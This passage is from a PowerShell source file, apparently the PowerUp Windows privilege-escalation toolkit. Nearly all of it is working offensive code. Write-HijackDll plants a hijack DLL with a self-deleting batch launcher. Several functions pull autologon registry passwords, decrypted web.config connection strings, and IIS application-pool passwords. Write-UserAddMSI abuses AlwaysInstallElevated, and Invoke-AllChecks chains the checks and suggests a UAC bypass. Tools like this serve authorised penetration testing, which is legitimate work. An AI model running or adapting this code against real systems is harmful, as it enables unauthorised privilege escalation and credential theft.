                Remove-Item -Path $Path -Recurse -Force -ErrorAction SilentlyContinue
            }
        }
        else{
            # if the folder already exists
            try {
                echo $Null > $TestPath

                $Out = New-Object PSObject 
                $Out | Add-Member Noteproperty 'HijackablePath' $Path
                $Out | Add-Member Noteproperty 'AbuseFunction' "Write-HijackDll -OutputFile '$Path\wlbsctrl.dll' -Command '...'"
                $Out
            }
            catch {} 
            finally {
                # Try to remove the item again just to be safe
                Remove-Item $TestPath -Force -ErrorAction SilentlyContinue
            }
        }
    }
    
    $ErrorActionPreference = $OrigError
}


function Write-HijackDll {
<#
    .SYNOPSIS

        Writes out a self-deleting 'debug.bat' file that executes a given command to
        $env:Temp\debug.bat, and writes out a hijackable .dll that launches the .bat.

    .PARAMETER OutputFile

        File name to write the .dll to.

    .PARAMETER Command

        Command to run in the .bat launcher.

    .PARAMETER BatPath

        Path to the .bat for the .dll to launch.

    .PARAMETER Arch

        Architeture of .dll to generate, x86 or x64. If not specified, will try to
        automatically determine.
#>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)]
        [String]
        $OutputFile,

        [Parameter(Mandatory = $True)]
        [String]
        $Command,

        [String]
        $BatPath,        

        [String]
        $Arch
    )

    function local:Invoke-PatchDll {
    <#
        .SYNOPSIS

            Patches a string in a binary byte array.

        .PARAMETER DllBytes

            Binary blog to patch.

        .PARAMETER FindString

            String to search for to replace.

        .PARAMETER ReplaceString

            String to replace FindString with
    #>

        [CmdletBinding()]
        param(
            [Parameter(Mandatory = $True)]
            [Byte[]]
            $DllBytes,

            [Parameter(Mandatory = $True)]
            [String]
            $FindString,

            [Parameter(Mandatory = $True)]
            [String]
            $ReplaceString
        )

        $FindStringBytes = ([system.Text.Encoding]::UTF8).GetBytes($FindString)
        $ReplaceStringBytes = ([system.Text.Encoding]::UTF8).GetBytes($ReplaceString)

        $Index = 0
        $S = [System.Text.Encoding]::ASCII.GetString($DllBytes)
        $Index = $S.IndexOf($FindString)

        if($Index -eq 0)
        {
            throw("Could not find string $FindString !")
        }

        for ($i=0; $i -lt $ReplaceStringBytes.Length; $i++)
        {
            $DllBytes[$Index+$i]=$ReplaceStringBytes[$i]
        }

        return $DllBytes
    }

    # generate with base64 -w 0 hijack32.dll > hijack32.b64
    $DllBytes32 = ""

    if($Arch) {
        if($Arch -eq "x64") {
            [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes64)
        }
        elseif($Arch -eq "x86") {
            [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes32)
        }
        else{
            Throw "Please specify x86 or x64 for the -Arch"
        }
    }
    else {
        # if no architecture if specified, try to auto-determine the arch
        if ($Env:PROCESSOR_ARCHITECTURE -eq "AMD64") {
            [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes64)
            $Arch = "x64"
        }
        else {
            [Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes32)
            $Arch = "x86"
        }
    }

    if(!$BatPath) {
        $parts = $OutputFile.split("\")
        $BatPath = ($parts[0..$($parts.length-2)] -join "\") + "\debug.bat"
    }
    else {
        # patch in the appropriate .bat launcher path
        $DllBytes = Invoke-PatchDll -DllBytes $DllBytes -FindString "debug.bat" -ReplaceString $BatPath
    }

    # build the launcher .bat
    if (Test-Path $BatPath) { Remove-Item -Force $BatPath }
    "@echo off\n" | Out-File -Encoding ASCII -Append $BatPath 
    "start /b $Command" | Out-File -Encoding ASCII -Append $BatPath 
    'start /b "" cmd /c del "%~f0"&exit /b' | Out-File -Encoding ASCII -Append $BatPath
    
    ".bat launcher written to: $BatPath"

    Set-Content -Value $DllBytes -Encoding Byte -Path $OutputFile
    "$Arch DLL Hijacker written to: $OutputFile"

    $Out = New-Object PSObject 
    $Out | Add-Member Noteproperty 'OutputFile' $OutputFile
    $Out | Add-Member Noteproperty 'Architecture' $Arch
    $Out | Add-Member Noteproperty 'BATLauncherPath' $BatPath
    $Out | Add-Member Noteproperty 'Command' $Command
    $Out
}


########################################################
#
# Registry Checks
#
########################################################

function Get-RegAlwaysInstallElevated {
<#
    .SYNOPSIS

        Checks if the AlwaysInstallElevated registry key is set.
        This meains that MSI files are always run with SYSTEM
        level privileges.

    .EXAMPLE

        PS C:\> Get-RegAlwaysInstallElevated

        Checks if the AlwaysInstallElevated registry key is set.
#>

    [CmdletBinding()]
    Param()
    
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    if (Test-Path "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer") {

        $HKLMval = (Get-ItemProperty -Path "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
        Write-Verbose "HKLMval: $($HKLMval.AlwaysInstallElevated)"

        if ($HKLMval.AlwaysInstallElevated -and ($HKLMval.AlwaysInstallElevated -ne 0)){

            $HKCUval = (Get-ItemProperty -Path "hkcu:SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction SilentlyContinue)
            Write-Verbose "HKCUval: $($HKCUval.AlwaysInstallElevated)"

            if ($HKCUval.AlwaysInstallElevated -and ($HKCUval.AlwaysInstallElevated -ne 0)){
                Write-Verbose "AlwaysInstallElevated enabled on this machine!"
                $True
            }
            else{
                Write-Verbose "AlwaysInstallElevated not enabled on this machine."
                $False
            }
        }
        else{
            Write-Verbose "AlwaysInstallElevated not enabled on this machine."
            $False
        }
    }
    else{
        Write-Verbose "HKLM:SOFTWARE\Policies\Microsoft\Windows\Installer does not exist"
        $False
    }

    $ErrorActionPreference = $OrigError
}


function Get-RegAutoLogon {
<#
    .SYNOPSIS

        Checks for DefaultUserName/DefaultPassword in the Winlogin registry section 
        if the AutoAdminLogon key is set.

    .EXAMPLE

        PS C:\> Get-RegAutoLogon
        Finds any autologon credentials left in the registry.

    .LINK

        https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/windows_autologin.rb
#>

    [CmdletBinding()]
    Param()

    $AutoAdminLogon = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AutoAdminLogon -ErrorAction SilentlyContinue)

    Write-Verbose "AutoAdminLogon key: $($AutoAdminLogon.AutoAdminLogon)"

    if ($AutoAdminLogon.AutoAdminLogon -ne 0){

        $DefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultDomainName -ErrorAction SilentlyContinue).DefaultDomainName
        $DefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName
        $DefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword
        $AltDefaultDomainName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultDomainName -ErrorAction SilentlyContinue).AltDefaultDomainName
        $AltDefaultUserName = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultUserName -ErrorAction SilentlyContinue).AltDefaultUserName
        $AltDefaultPassword = $(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name AltDefaultPassword -ErrorAction SilentlyContinue).AltDefaultPassword

        if ($DefaultUserName -or $AltDefaultUserName) {            
            $Out = New-Object PSObject 
            $Out | Add-Member Noteproperty 'DefaultDomainName' $DefaultDomainName
            $Out | Add-Member Noteproperty 'DefaultUserName' $DefaultUserName
            $Out | Add-Member Noteproperty 'DefaultPassword' $DefaultPassword
            $Out | Add-Member Noteproperty 'AltDefaultDomainName' $AltDefaultDomainName
            $Out | Add-Member Noteproperty 'AltDefaultUserName' $AltDefaultUserName
            $Out | Add-Member Noteproperty 'AltDefaultPassword' $AltDefaultPassword
            $Out
        }
    }
}   


function Get-VulnAutoRun {
<#
    .SYNOPSIS

        Returns HKLM autoruns where the current user can modify
        the binary/script (or its config) specified.

    .EXAMPLE

        PS C:\> Get-VulnAutoRun

        Return vulneable autorun binaries (or associated configs).
#>

    [CmdletBinding()]Param()
    $SearchLocations = @(   "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                            "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce",
                            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunService",
                            "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceService",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService",
                            "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService"
                        )

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {
        
        $Keys = Get-Item -Path $_
        $ParentPath = $_

        ForEach ($Name in $Keys.GetValueNames()) {

            $Path = $($Keys.GetValue($Name))

            $Path | Get-ModifiableFile | ForEach-Object {
                $Out = New-Object PSObject 
                $Out | Add-Member Noteproperty 'Key' "$ParentPath\$Name"
                $Out | Add-Member Noteproperty 'Path' $Path
                $Out | Add-Member Noteproperty 'ModifiableFile' $_
                $Out
            }
        }
    }

    $ErrorActionPreference = $OrigError
}


########################################################
#
# Misc.
#
########################################################

function Get-VulnSchTask {
<#
    .SYNOPSIS

        Returns scheduled tasks where the current user can modify
        the script associated with the task action.

    .EXAMPLE

        PS C:\> Get-VulnSchTask

        Return vulnerable scheduled tasks.
#>

    [CmdletBinding()]Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $Path = "$($ENV:windir)\System32\Tasks"

    # recursively enumerate all schtask .xmls
    Get-ChildItem -Path $Path -Recurse | Where-Object { ! $_.PSIsContainer } | ForEach-Object {
        try {
            $TaskName = $_.Name
            $TaskXML = [xml] (Get-Content $_.FullName)
            if($TaskXML.Task.Triggers) {

                $TaskTrigger = $TaskXML.Task.Triggers.OuterXML
                
                # check schtask command
                $TaskXML.Task.Actions.Exec.Command | Get-ModifiableFile | ForEach-Object {
                    $Out = New-Object PSObject 
                    $Out | Add-Member Noteproperty 'TaskName' $TaskName
                    $Out | Add-Member Noteproperty 'TaskFilePath' $_
                    $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
                    $Out
                }

                # check schtask arguments
                $TaskXML.Task.Actions.Exec.Arguments | Get-ModifiableFile | ForEach-Object {
                    $Out = New-Object PSObject 
                    $Out | Add-Member Noteproperty 'TaskName' $TaskName
                    $Out | Add-Member Noteproperty 'TaskFilePath' $_
                    $Out | Add-Member Noteproperty 'TaskTrigger' $TaskTrigger
                    $Out
                }
            }
        }
        catch {
            Write-Debug "Error: $_"
        }
    }

    $ErrorActionPreference = $OrigError
}


function Get-UnattendedInstallFile {
<#
    .SYNOPSIS

        Checks several locations for remaining unattended installation files, 
        which may have deployment credentials.

    .EXAMPLE

        PS C:\> Get-UnattendedInstallFile

        Finds any remaining unattended installation files.

    .LINK

        http://www.fuzzysecurity.com/tutorials/16.html
#>
    
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    $SearchLocations = @(   "c:\sysprep\sysprep.xml",
                            "c:\sysprep\sysprep.inf",
                            "c:\sysprep.inf",
                            (Join-Path $Env:WinDir "\Panther\Unattended.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend\Unattended.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend.xml"),
                            (Join-Path $Env:WinDir "\Panther\Unattend\Unattend.xml"),
                            (Join-Path $Env:WinDir "\System32\Sysprep\unattend.xml"),
                            (Join-Path $Env:WinDir "\System32\Sysprep\Panther\unattend.xml")
                        )

    # test the existence of each path and return anything found
    $SearchLocations | Where-Object { Test-Path $_ } | ForEach-Object {
        $Out = New-Object PSObject 
        $Out | Add-Member Noteproperty 'UnattendPath' $_
        $Out
    }

    $ErrorActionPreference = $OrigError
}


function Get-Webconfig {   
<#
    .SYNOPSIS

        This script will recover cleartext and encrypted connection strings from all web.config 
        files on the system.  Also, it will decrypt them if needed.

        Author: Scott Sutherland - 2014, NetSPI
        Author: Antti Rantasaari - 2014, NetSPI

    .DESCRIPTION

        This script will identify all of the web.config files on the system and recover the  
        connection strings used to support authentication to backend databases.  If needed, the 
        script will also decrypt the connection strings on the fly.  The output supports the 
        pipeline which can be used to convert all of the results into a pretty table by piping 
        to format-table.
   
    .EXAMPLE

        Return a list of cleartext and decrypted connect strings from web.config files.

        PS C:\>get-webconfig        
        user   : s1admin
        pass   : s1password
        dbserv : 192.168.1.103\server1
        vdir   : C:\test2
        path   : C:\test2\web.config
        encr   : No

        user   : s1user
        pass   : s1password
        dbserv : 192.168.1.103\server1
        vdir   : C:\inetpub\wwwroot
        path   : C:\inetpub\wwwroot\web.config
        encr   : Yes
   
    .EXAMPLE

        Return a list of clear text and decrypted connect strings from web.config files.

        PS C:\>get-webconfig | Format-Table -Autosize

        user    pass       dbserv                vdir               path                          encr
        ----    ----       ------                ----               ----                          ----
        s1admin s1password 192.168.1.101\server1 C:\App1            C:\App1\web.config            No  
        s1user  s1password 192.168.1.101\server1 C:\inetpub\wwwroot C:\inetpub\wwwroot\web.config No  
        s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\test\web.config       No  
        s2user  s2password 192.168.1.102\server2 C:\App2            C:\App2\web.config            Yes 
        s3user  s3password 192.168.1.103\server3 D:\App3            D:\App3\web.config            No 

     .LINK

        https://github.com/darkoperator/Posh-SecMod/blob/master/PostExploitation/PostExploitation.psm1
        http://www.netspi.com
        https://raw2.github.com/NetSPI/cmdsql/master/cmdsql.aspx
        http://www.iis.net/learn/get-started/getting-started-with-iis/getting-started-with-appcmdexe
        http://msdn.microsoft.com/en-us/library/k6h9cz8h(v=vs.80).aspx

     .NOTES

        Below is an alterantive method for grabbing connection strings, but it doesn't support decryption.
        for /f "tokens=*" %i in ('%systemroot%\system32\inetsrv\appcmd.exe list sites /text:name') do %systemroot%\system32\inetsrv\appcmd.exe list config "%i" -section:connectionstrings
#>
    
    [CmdletBinding()]Param()

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\InetSRV\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable 

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")  
        $Null = $DataTable.Columns.Add("dbserv")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("path")
        $Null = $DataTable.Columns.Add("encr")

        # Get list of virtual directories in IIS 
        C:\Windows\System32\InetSRV\appcmd.exe list vdir /text:physicalpath | 
        ForEach-Object { 

            $CurrentVdir = $_

            # Converts CMD style env vars (%) to powershell env vars (env)
            if ($_ -like "*%*") {            
                $EnvarName = "`$Env:"+$_.split("%")[1]
                $EnvarValue = Invoke-Expression $EnvarName
                $RestofPath = $_.split("%")[2]            
                $CurrentVdir  = $EnvarValue+$RestofPath
            }

            # Search for web.config files in each virtual directory
            $CurrentVdir | Get-ChildItem -Recurse -Filter web.config | ForEach-Object {
            
                # Set web.config path
                $CurrentPath = $_.fullname

                # Read the data from the web.config xml file
                [xml]$ConfigFile = Get-Content $_.fullname

                # Check if the connectionStrings are encrypted
                if ($ConfigFile.configuration.connectionStrings.add) {
                                
                    # Foreach connection string add to data table
                    $ConfigFile.configuration.connectionStrings.add| 
                    ForEach-Object {

                        [String]$MyConString = $_.connectionString
                        if($MyConString -like "*password*") {
                            $ConfUser = $MyConString.Split("=")[3].Split(";")[0]
                            $ConfPass = $MyConString.Split("=")[4].Split(";")[0]
                            $ConfServ = $MyConString.Split("=")[1].Split(";")[0]
                            $ConfVdir = $CurrentVdir
                            $ConfPath = $CurrentPath
                            $ConfEnc = "No"
                            $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ,$ConfVdir,$CurrentPath, $ConfEnc)
                        }
                    }  

                }
                else {

                    # Find newest version of aspnet_regiis.exe to use (it works with older versions)
                    $aspnet_regiis_path = Get-ChildItem -Recurse -filter aspnet_regiis.exe c:\Windows\Microsoft.NET\Framework\ | Sort-Object -Descending | Select-Object fullname -First 1

                    # Check if aspnet_regiis.exe exists
                    if (Test-Path  ($aspnet_regiis_path.FullName)){

                        # Setup path for temp web.config to the current user's temp dir
                        $WebConfigPath = (Get-Item $Env:temp).FullName + "\web.config"

                        # Remove existing temp web.config
                        if (Test-Path  ($WebConfigPath)) 
                        { 
                            Remove-Item $WebConfigPath 
                        }
                    
                        # Copy web.config from vdir to user temp for decryption
                        Copy-Item $CurrentPath $WebConfigPath

                        #Decrypt web.config in user temp                 
                        $aspnet_regiis_cmd = $aspnet_regiis_path.fullname+' -pdf "connectionStrings" (get-item $Env:temp).FullName'
                        $Null = Invoke-Expression $aspnet_regiis_cmd

                        # Read the data from the web.config in temp
                        [xml]$TMPConfigFile = Get-Content $WebConfigPath

                        # Check if the connectionStrings are still encrypted
                        if ($TMPConfigFile.configuration.connectionStrings.add)
                        {
                                
                            # Foreach connection string add to data table
                            $TMPConfigFile.configuration.connectionStrings.add | ForEach-Object {

                                [String]$MyConString = $_.connectionString
                                if($MyConString -like "*password*") {
                                    $ConfUser = $MyConString.Split("=")[3].Split(";")[0]
                                    $ConfPass = $MyConString.Split("=")[4].Split(";")[0]
                                    $ConfServ = $MyConString.Split("=")[1].Split(";")[0]
                                    $ConfVdir = $CurrentVdir
                                    $ConfPath = $CurrentPath
                                    $ConfEnc = "Yes"
                                    $Null = $DataTable.Rows.Add($ConfUser, $ConfPass, $ConfServ,$ConfVdir,$CurrentPath, $ConfEnc)
                                }
                            }  

                        }else{
                            Write-Verbose "Decryption of $CurrentPath failed."
                            $False                      
                        }
                    }else{
                        Write-Verbose "aspnet_regiis.exe does not exist in the default location."
                        $False
                    }
                }           
            }
        }

        # Check if any connection strings were found 
        if( $DataTable.rows.Count -gt 0 ) {

            # Display results in list view that can feed into the pipeline    
            $DataTable |  Sort-Object user,pass,dbserv,vdir,path,encr | Select-Object user,pass,dbserv,vdir,path,encr -Unique       
        }
        else {

            # Status user
            Write-Verbose "No connectionStrings found."
            $False
        }     

    }
    else {
        Write-Verbose "Appcmd.exe does not exist in the default location."
        $False
    }

    $ErrorActionPreference = $OrigError
}


function Get-ApplicationHost {
 <#
    .SYNOPSIS

        This script will recover encrypted application pool and virtual directory passwords from the applicationHost.config on the system.
       
    .DESCRIPTION

        This script will decrypt and recover application pool and virtual directory passwords
        from the applicationHost.config file on the system.  The output supports the 
        pipeline which can be used to convert all of the results into a pretty table by piping 
        to format-table.
       
    .EXAMPLE

        Return application pool and virtual directory passwords from the applicationHost.config on the system.
           
        PS C:\>get-ApplicationHost         
        user    : PoolUser1
        pass    : PoolParty1!
        type    : Application Pool
        vdir    : NA
        apppool : ApplicationPool1
        user    : PoolUser2
        pass    : PoolParty2!
        type    : Application Pool
        vdir    : NA
        apppool : ApplicationPool2
        user    : VdirUser1
        pass    : VdirPassword1!
        type    : Virtual Directory
        vdir    : site1/vdir1/
        apppool : NA
        user    : VdirUser2
        pass    : VdirPassword2!
        type    : Virtual Directory
        vdir    : site2/
        apppool : NA
       
    .EXAMPLE

        Return a list of cleartext and decrypted connect strings from web.config files.
           
        PS C:\>get-ApplicationHost | Format-Table -Autosize
               
        user          pass               type              vdir         apppool
        ----          ----               ----              ----         -------
        PoolUser1     PoolParty1!       Application Pool   NA           ApplicationPool1
        PoolUser2     PoolParty2!       Application Pool   NA           ApplicationPool2 
        VdirUser1     VdirPassword1!    Virtual Directory  site1/vdir1/ NA     
        VdirUser2     VdirPassword2!    Virtual Directory  site2/       NA    

    .LINK

        https://github.com/darkoperator/Posh-SecMod/blob/master/PostExploitation/PostExploitation.psm1
        http://www.netspi.com
        http://www.iis.net/learn/get-started/getting-started-with-iis/getting-started-with-appcmdexe
        http://msdn.microsoft.com/en-us/library/k6h9cz8h(v=vs.80).aspx

    .NOTES

        Author: Scott Sutherland - 2014, NetSPI
        Version: Get-ApplicationHost v1.0
        Comments: Should work on IIS 6 and Above
#>

    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe"))
    {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable 

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")  
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object { 
        
            #Get application pool name
            $PoolName = $_
        
            #Get username           
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd 
                    
            #Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd 

            #Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array]))
            {
                #Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName) 
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object { 

            #Get Virtual Directory Name
            $VdirName = $_
        
            #Get username           
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd
                    
            #Get password       
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            #Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array]))
            {
                #Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline    
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique       
        }
        else{
            # Status user
            Write-Verbose "No application pool or virtual directory passwords were found."
            $False
        }     
    }else{
        Write-Verbose "Appcmd.exe does not exist in the default location."
        $False
    }

    $ErrorActionPreference = $OrigError
}


function Write-UserAddMSI {
<#
    .SYNOPSIS

        Writes out a precompiled MSI installer that prompts for a user/group addition. 
        This function can be used to abuse Get-RegAlwaysInstallElevated.

    .EXAMPLE

        PS C:\> Write-UserAddMSI

        Writes the user add MSI to the local directory.
#>

    $Path = "UserAdd.msi"

    $Binary = ""

    try {
        [System.Convert]::FromBase64String( $Binary ) | Set-Content -Path $Path -Encoding Byte
        Write-Verbose "MSI written out to '$Path'"

        $Out = New-Object PSObject 
        $Out | Add-Member Noteproperty 'OutputPath' $Path
        $Out
    }
    catch {
        Write-Warning "Error while writing to location '$Path': $_"
        $Out = New-Object PSObject 
        $Out | Add-Member Noteproperty 'OutputPath' $_
        $Out
    }
}


function Invoke-AllChecks {
<#
    .SYNOPSIS

        Runs all functions that check for various Windows privilege escalation opportunities.

    .PARAMETER HTMLReport

        Switch. Write a HTML version of the report to SYSTEM.username.html.

    .EXAMPLE

        PS C:\> Invoke-AllChecks

        Runs all escalation checks, output statuses for whatever's found.
#>

    [CmdletBinding()]
    Param(
        [Switch]
        $HTMLReport
    )

    if($HTMLReport) {
        $HtmlReportFile = "$($Env:ComputerName).$($Env:UserName).html"

        $Header = "<style>"
        $Header = $Header + "BODY{background-color:peachpuff;}"
        $Header = $Header + "TABLE{border-width: 1px;border-style: solid;border-color: black;border-collapse: collapse;}"
        $Header = $Header + "TH{border-width: 1px;padding: 0px;border-style: solid;border-color: black;background-color:thistle}"
        $Header = $Header + "TD{border-width: 3px;padding: 0px;border-style: solid;border-color: black;background-color:palegoldenrod}"
        $Header = $Header + "</style>"

        ConvertTo-HTML -Head $Header -Body "<H1>PowerUp report for '$($Env:ComputerName).$($Env:UserName)'</H1>" | Out-File $HtmlReportFile
    }

    # initial admin checks

    "`n[*] Running Invoke-AllChecks"

    $IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

    if($IsAdmin){
        "[+] Current user already has local administrative privileges!"
        
        if($HTMLReport) {
            ConvertTo-HTML -Head $Header -Body "<H2>User Has Local Admin Privileges!</H2>" | Out-File -Append $HtmlReportFile
        }
        # return
    }
    else{
        "`n`n[*] Checking if user is in a local group with administrative privileges..."
        if( ($(whoami /groups) -like "*S-1-5-32-544*").length -eq 1 ){
            "[+] User is in a local group that grants administrative privileges!"
            "[+] Run a BypassUAC attack to elevate privileges to admin."

            if($HTMLReport) {
                ConvertTo-HTML -Head $Header -Body "<H2> User In Local Group With Adminisrtative Privileges</H2>" | Out-File -Append $HtmlReportFile
            }
        }
    }


    # Service checks

    "`n`n[*] Checking for unquoted service paths..."
    $Results = Get-ServiceUnquoted
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Unquoted Service Paths</H2>" | Out-File -Append $HtmlReportFile
    }

    "`n`n[*] Checking service executable and argument permissions..."
    $Results = Get-ServiceFilePermission
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Service Executable Permissions</H2>" | Out-File -Append $HtmlReportFile
    }

    "`n`n[*] Checking service permissions..."
    $Results = Get-ServicePermission
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Service Permissions</H2>" | Out-File -Append $HtmlReportFile
    }


    # .dll hijacking

    "`n`n[*] Checking %PATH% for potentially hijackable .dll locations..."
    $Results = Find-PathHijack
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>%PATH% .dll Hijacks</H2>" | Out-File -Append $HtmlReportFile
    }


    # registry checks

    "`n`n[*] Checking for AlwaysInstallElevated registry key..."
    if (Get-RegAlwaysInstallElevated) {
        $Out = New-Object PSObject 
        $Out | Add-Member Noteproperty 'OutputFile' $OutputFile
        $Out | Add-Member Noteproperty 'AbuseFunction' "Write-UserAddMSI"
        $Results = $Out

        $Results | Format-List
        if($HTMLReport) {
            $Results | ConvertTo-HTML -Head $Header -Body "<H2>AlwaysInstallElevated</H2>" | Out-File -Append $HtmlReportFile
        }
    }

    "`n`n[*] Checking for Autologon credentials in registry..."
    $Results = Get-RegAutoLogon
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Registry Autologons</H2>" | Out-File -Append $HtmlReportFile
    }


    "`n`n[*] Checking for vulnerable registry autoruns and configs..."
    $Results = Get-VulnAutoRun
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Registry Autoruns</H2>" | Out-File -Append $HtmlReportFile
    }

    # other checks

    "`n`n[*] Checking for vulnerable schtask files/configs..."
    $Results = Get-VulnSchTask
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Vulnerabl Schasks</H2>" | Out-File -Append $HtmlReportFile
    }

    "`n`n[*] Checking for unattended install files..."
    $Results = Get-UnattendedInstallFile
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Unattended Install Files</H2>" | Out-File -Append $HtmlReportFile
    }

    "`n`n[*] Checking for encrypted web.config strings..."
    $Results = Get-Webconfig | Where-Object {$_}
    $Results | Format-List
    if($HTMLReport) {
        $Results | ConvertTo-HTML -Head $Header -Body "<H2>Encrypted 'web.config' String</H2>" | Out-File -Append $HtmlReportFile
    }

    "`n`n[*] Checking for encrypted application pool and virtual directory passwords..."
    $Results = Get-ApplicationHost | Where-Object {$_}
    $Results | Format-List

    if($HTMLReport) {
        "NO HTML REPORT FOR YOU... :)"
    }
}